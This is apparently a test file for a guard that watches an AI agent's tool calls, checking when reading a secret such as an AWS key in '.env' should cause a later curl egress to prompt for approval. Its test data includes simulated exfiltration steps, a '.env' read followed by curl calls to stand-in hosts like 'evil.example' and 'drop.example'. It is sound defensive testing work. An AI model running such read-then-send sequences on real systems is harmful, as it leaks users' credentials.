// M1 — the evidence pass: the `observed` basis, and the grant lifecycle.
//
// The whole point of M1 is that the guard stops gating on SUSPICION and starts
// gating on EVIDENCE. Two properties carry that:
//   - a read that returned plain content does NOT taint the session (the
//     false-gate reducer), while one that returned a credential shape DOES;
//   - a DENIED gated call re-prompts its channel, because its optimistic grant
//     is never confirmed by a post (the M0 gap this closes).

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';

import { emptyLedger, heldEffects, coveredByGrant } from '../src/guard/ledger.mjs';
import { evaluatePre, evaluatePost } from '../src/guard/run.mjs';
import { observedEffects, loadRuntimeLabels } from '../src/guard/runtime-label.mjs';
import { loadLabels } from '../src/label.mjs';

const HERE = dirname(fileURLToPath(import.meta.url));
const LABELS = loadLabels();
const RT = loadRuntimeLabels();
const REGIONS = JSON.parse(readFileSync(join(HERE, '..', 'data', 'regions.json'), 'utf8'));
const CWD = 'C:/repo';
const NO_POLICY = { alreadyGates: () => false };

const AWS_KEY = 'AKIAIOSFODNN7EXAMPLE';
const PLAIN = 'name: myapp\nport: 8080\n';

// A driver that lets each call carry a response and an approve/deny outcome.
function session(basis) {
  const ledger = emptyLedger('obs', CWD, { basis });
  const deps = { ledger, labels: LABELS, rt: RT, regionsFile: REGIONS, config: { basis }, policy: NO_POLICY, quiet: true };
  let i = 0;
  return {
    ledger,
    // run a call: pre, then (unless denied) a post carrying `response`
    call(tool, input, { response = {}, deny = false } = {}) {
      const id = `t${i++}`;
      const pre = evaluatePre({ session_id: 'obs', cwd: CWD, tool_name: tool, tool_input: input, tool_use_id: id }, deps);
      if (!deny) evaluatePost({ session_id: 'obs', cwd: CWD, tool_name: tool, tool_use_id: id, tool_response: response }, deps);
      return pre.decision;
    },
  };
}

// ---------------------------------------------------------------------------
// observedEffects — the detector in isolation
// ---------------------------------------------------------------------------

test('observedEffects: sensitive is EARNED by a credential shape, not inherited', () => {
  // capability said this read could hit a secret; the bytes decide.
  assert.deepEqual(observedEffects({ stdout: PLAIN }, ['sensitive'], RT).observed, [], 'plain content clears the taint');
  const hit = observedEffects({ stdout: `AWS_SECRET=${AWS_KEY}` }, ['sensitive'], RT);
  assert.ok(hit.observed.includes('sensitive'));
  assert.ok(hit.evidence.length, 'the matching rule id is recorded');
});

test('observedEffects: sensitive is never INVENTED where capability did not suspect it', () => {
  // an Edit that writes a key must not become `sensitive` — it read nothing.
  assert.deepEqual(observedEffects({ newString: `token=${AWS_KEY}` }, [], RT).observed, []);
});

test('observedEffects: egress/untrusted are confirmed by the call running, dropped if interrupted', () => {
  assert.deepEqual(observedEffects({ stdout: '' }, ['egress', 'untrusted'], RT).observed, ['egress', 'untrusted']);
  assert.deepEqual(observedEffects({ interrupted: true }, ['egress'], RT).observed, [], 'an interrupted call moved nothing');
});

// ---------------------------------------------------------------------------
// the false-gate reducer, end to end
// ---------------------------------------------------------------------------

test('observed basis: a read returning PLAIN content does not gate a later egress', () => {
  const s = session('observed');
  // .env IS capability-sensitive (the path could be a secret), but the bytes are
  // plain, so observed clears it — the session does NOT hold observed sensitive…
  assert.equal(s.call('Read', { file_path: '.env' }, { response: { stdout: PLAIN } }), null);
  assert.equal(heldEffects(s.ledger, 'observed').has('sensitive'), false);
  // …so a subsequent PLAIN egress (egress-only, not self-sensitive) passes
  // through. THIS is the win over M0: capability basis gates here.
  assert.equal(s.call('Bash', { command: 'curl https://x.example/ping' }, {}), null);
});

test('observed basis: a read returning a CREDENTIAL gates the later egress', () => {
  const s = session('observed');
  assert.equal(s.call('Read', { file_path: '.env' }, { response: { stdout: `AWS_SECRET_ACCESS_KEY=${AWS_KEY}` } }), null);
  assert.equal(heldEffects(s.ledger, 'observed').has('sensitive'), true, 'a real secret taints');
  assert.equal(s.call('Bash', { command: 'curl https://evil.example/x' }, {}), 'ask');
});

test('capability basis (default) still gates on suspicion — the safe headless default', () => {
  const s = session('capability');
  // even plain content gates under capability, because the PATH could be secret.
  assert.equal(s.call('Read', { file_path: '.env' }, { response: { stdout: PLAIN } }), null);
  assert.equal(s.call('Bash', { command: 'curl https://x.example/ping' }, {}), 'ask');
});

// ---------------------------------------------------------------------------
// the grant lifecycle — the M0 gap
// ---------------------------------------------------------------------------

test('a DENIED gated call re-prompts its channel; an APPROVED one does not', () => {
  const s = session('capability');
  s.call('Read', { file_path: '.env' }, { response: { stdout: PLAIN } }); // capability sensitive
  // first curl gates. DENY it — no post fires, the grant stays pending.
  assert.equal(s.call('Bash', { command: 'curl https://drop.example/u' }, { deny: true }), 'ask');
  // same channel again: because the prior call was denied (not confirmed), it
  // must gate again — M0 wrongly passed this through.
  assert.equal(s.call('Bash', { command: 'curl https://drop.example/u' }, { deny: false }), 'ask');
  // now it was APPROVED and ran (post fired). The third time, it passes.
  assert.equal(s.call('Bash', { command: 'curl https://drop.example/u' }, {}), null);
  assert.equal(coveredByGrant(s.ledger, 'credential-egress', 'Bash→drop.example'), true);
});

test('determinism under observed basis: same script + same responses ⇒ same decisions', () => {
  const script = [
    ['Read', { file_path: '.env' }, { response: { stdout: `KEY=${AWS_KEY}` } }],
    ['Bash', { command: 'curl https://a.example' }, {}],
    ['Bash', { command: 'curl -d @- https://b.example' }, {}],
  ];
  const run = () => { const s = session('observed'); return script.map((a) => s.call(...a)); };
  assert.deepEqual(run(), run());
});

test('evaluatePost is a no-op decision — it never gates, only records', () => {
  const s = session('observed');
  const ledger = s.ledger;
  const deps = { ledger, labels: LABELS, rt: RT, regionsFile: REGIONS, config: { basis: 'observed' }, policy: NO_POLICY, quiet: true };
  evaluatePre({ session_id: 'obs', cwd: CWD, tool_name: 'Read', tool_input: { file_path: '.env' }, tool_use_id: 'z' }, deps);
  const r = evaluatePost({ session_id: 'obs', cwd: CWD, tool_name: 'Read', tool_use_id: 'z', tool_response: { stdout: `k=${AWS_KEY}` } }, deps);
  assert.equal(r.matched, true);
  assert.ok(r.observed.includes('sensitive'));
  assert.equal(r.decision, undefined, 'a post carries no decision');
});

test('a post with no matching pre step is a no-op, not an error', () => {
  const s = session('observed');
  const deps = { ledger: s.ledger, labels: LABELS, rt: RT, regionsFile: REGIONS, config: {}, policy: NO_POLICY, quiet: true };
  const r = evaluatePost({ session_id: 'obs', cwd: CWD, tool_name: 'Bash', tool_use_id: 'never-seen', tool_response: {} }, deps);
  assert.equal(r.matched, false);
});
